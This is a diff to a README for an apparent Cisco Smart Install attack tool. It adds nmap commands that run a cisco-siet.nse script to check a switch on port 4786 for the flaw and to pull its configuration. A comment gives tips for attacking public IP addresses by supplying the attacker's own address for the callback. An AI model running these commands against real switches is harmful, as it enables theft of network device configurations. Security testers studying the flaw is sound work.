@@ -2,10 +2,15 @@
 
 Cisco Smart Install is a plug-and-play configuration and image-management feature that provides zero-touch deployment for new switches. You can ship a switch to a location, place it in the network and power it on with no configuration required on the device.
 
-You can easy identify it using `nmap`: 
-
-```
-nmap -p 4786 -v 192.168.0.1
+You can easy identify it using nmap cisco-siet.nse script. Just download it and run it: 
+```	
+nmap -p 4786 -v 192.168.0.1	# By default, it will just test whether host is vulnerable or not
+$ nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse
+# You can pass argument to get config
+# Note: you need to run it as root
+# If you are attacking public ip, make sure to provide your public ip to the script (cisco-siet.addr=<PUBLIC_IP>)
+$ sudo nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse \
+> --script-args "cisco-siet.get"
 ```
 
 This protocol has a few security issues and this simple tool helps you to use all of them.:
